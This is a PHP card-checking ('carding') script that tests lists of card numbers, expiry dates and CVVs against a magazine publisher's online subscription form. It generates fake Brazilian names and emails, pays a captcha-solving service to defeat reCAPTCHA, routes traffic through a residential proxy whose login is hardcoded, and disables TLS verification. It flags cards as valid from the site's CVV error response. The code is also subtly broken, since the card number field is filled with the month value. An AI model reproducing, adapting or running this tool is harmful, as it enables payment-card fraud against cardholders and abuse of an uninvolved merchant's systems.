<?php
  /*/####################/*/
###### CODER: @SEMNICKOFICIAL #######
/*/###################/*/
error_reporting(1);

function capturar($separar, $inicio, $fim){
    return explode($fim, explode($inicio, $separar)[1])[0] ?? null;
}

$cookieFile = __DIR__ . "/time00001.txt"; 

if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

function replace_unicode_escape_sequence($match) {
    return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE');
  }
  function unicode_decode($str) {
    return str_replace('\/', '/', stripslashes($str));
}


function GerarNome() {
    $nomes = [
        "Joao", "Maria", "Pedro", "Ana", "Carlos", "Beatriz", "Fernando", "Juliana", "Lucas", "Camila", 
        "Marcos", "Larissa", "Ricardo", "Patricia", "Roberto", "Vanessa", "Eduardo", "Gabriela", "Alexandre", "Sofia", 
        "Bruno", "Isabela", "Andre", "Rafaela", "Diego", "Fernanda", "Thiago", "Helena", "Leonardo", "Paula", 
        "Felipe", "Clara", "Gustavo", "Lorena", "Samuel", "Luiza", "Victor", "Manuela", "Daniel", "Alice", 
        "Miguel", "Laura", "Rafael", "Bianca", "Enzo", "Valentina", "Mateus", "Yasmin", "Henrique", "Melissa", 
        "Antonio", "Esther", "Marcelo", "Dbora", "Vinicius", "Nicole", "Otavio", "Lara", "Rodrigo", "Eloa", 
        "Murilo", "Sabrina", "Arthur", "Sophia", "Luana", "Eduarda", "Marcos", "Ravi", "Breno", "Matias"
    ];
    return $nomes[array_rand($nomes)];
  }

  function GerarSobrenome() {
    $sobrenomes = [
        "Silva", "Souza", "Oliveira", "Santos", "Pereira", "Costa", "Carvalho", "Almeida", "Ribeiro", "Fernandes", 
        "Lima", "Gomes", "Martins", "Araujo", "Barbosa", "Rocha", "Dias", "Mendes", "Freitas", "Cardoso", 
        "Monteiro", "Correia", "Castro", "Nascimento", "Moreira", "Vieira", "Pinheiro", "Teixeira", "Barros", "Duarte", 
        "Farias", "Andrade", "Cavalcante", "Moura", "Batista", "Pinto", "Macedo", "Lopes", "Miranda", "Nunes"
    ];
    return $sobrenomes[array_rand($sobrenomes)];
  }
  
  
  function GerarEmail($nome,$sobrenome){
    $provedores = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "live.com", "icloud.com"];
    $nome = strtolower($nome);
    $sobrenome = strtolower($sobrenome);
    $rand = rand(10,9999);
    $provedor = $provedores[array_rand($provedores)];
    return $nome . $sobrenome . $rand . '@' . $provedor;
  }

$nome = GerarNome();
$sobrenome = GerarSobrenome();
$email = GerarEmail($nome,$sobrenome);


$lista = $_GET['lista'];
$separarlist = explode('|', $lista); 
$cc = trim($separarlist[0]);
$mes = trim($separarlist[1]);
$ano = trim($separarlist[2]);
$cvv = trim($separarlist[3]);

$ano2 = (strlen($ano) == 4) ? substr($ano, -2) : $ano;

switch ($mes) {
    case '01': $mes = '1'; break;
    case '02': $mes = '2'; break;
    case '03': $mes = '3'; break;
    case '04': $mes = '4'; break;
    case '05': $mes = '5'; break;
    case '06': $mes = '6'; break;
    case '07': $mes = '7'; break;
    case '08': $mes = '8'; break;
    case '09': $mes = '9'; break;
  }




$k_google = '6LeC_dwUAAAAAAYrLXgGm6pG2S2i401uf-2X7Xgj';
$url = 'https://mountainmedia.magazinemanager.com/';
$key_2cap = $_GET['key'];


class getConnection
{


    public function filtro($string)
    {
        return $v1 = explode("|", $string)[1];
    }

    public function enviar($k_google, $key_2cap, $url)
    {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "http://2captcha.com/in.php?key=$key_2cap&method=userrecaptcha&googlekey=$k_google&pageurl=$url",
            CURLOPT_RETURNTRANSFER => true,
            $headers = array(),
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_CUSTOMREQUEST => "GET"
        ]);
        return $response = curl_exec($ch);
    }

    public function resolvido($key_2cap, $id)
    {
        while (true) {
            usleep(200);
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => "https://2captcha.com/res.php?key=$key_2cap&action=get&id=$id&json=1",
                CURLOPT_RETURNTRANSFER => true,
                $headers = array(),
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_CUSTOMREQUEST => "GET"
            ]);
            $response = curl_exec($ch);
            $resposta = json_decode($response, true)['request'];

            if ($resposta != 'CAPCHA_NOT_READY') {
                return $resposta;
                break;
            }
        }
    }
}

$authenticate = new getConnection();
$enviar = $authenticate->enviar($k_google, $key_2cap, $url);
$id = $authenticate->filtro($enviar);
$resolvido = $authenticate->resolvido($key_2cap, $id);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mountainmedia.magazinemanager.com/subscribe/subscribe_renewOnlineCFGS_MountainMedia.asp');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, "gw.dataimpulse.com");
curl_setopt($ch, CURLOPT_PROXYPORT, 824);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "2a05e559e7491bbe79e6__cr.ar,br,ca,cl,co,ec,pe,us:5588c39621563243");
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: mountainmedia.magazinemanager.com',
    'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    'origin: https://mountainmedia.magazinemanager.com',
    'content-type: application/x-www-form-urlencoded',
    'upgrade-insecure-requests: 1',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://mountainmedia.magazinemanager.com/subscribe/subscribe_renewOnlineCFGS_MountainMedia.asp',
    'accept-language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ccUseShippingAddress=1&renew=&contactid=&subscriberid=&subscriptionid=&lastissue=&lastyear=&magazine=Berkshire+Magazine&Period=1&Price1=23&Price2=46&source=BERK_23&sourceid=223&SubmitForm=1&FirstName='.$nome.'&LastName='.$sobrenome.'&CompanyName=IMPERIUM&Email='.$email.'&Address1=112+Mulberry+Street+10013&Address2=&City=NEW+YORK&State=NY&StateOptions=&Zip=10013&Country=Estados+Unidos&g-recaptcha-response='.$resolvido.'&ccName='.$nome.'+'.$sobrenome.'&ccNumber='.$mes.'&ccMonth=3&ccYear='.$ano.'&CVV='.$cvv.'&chkUseShippingAddress=1');
$response = curl_exec($ch);
curl_close($ch);

$mm = capturar($response,'<br/><ul><li>','</li></ul>');

if(strpos($response,'N7: CVV2 Value supplied is invali')){
    echo ("<span class='badge badge-success'> ✔️ </span>
    <span class='badge badge-dark'> $lista </span>
    <span class='badge badge-success'> $mm </span>
    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
    exit();
}
else {
    echo ("<span class='badge badge-danger'> ❌ </span>
    <span class='badge badge-dark'> $lista </span>
    <span class='badge badge-danger'> $mm </span>
    <span class='badge badge-dark'>BY: AUTHCENTERGG</span><br>");
}
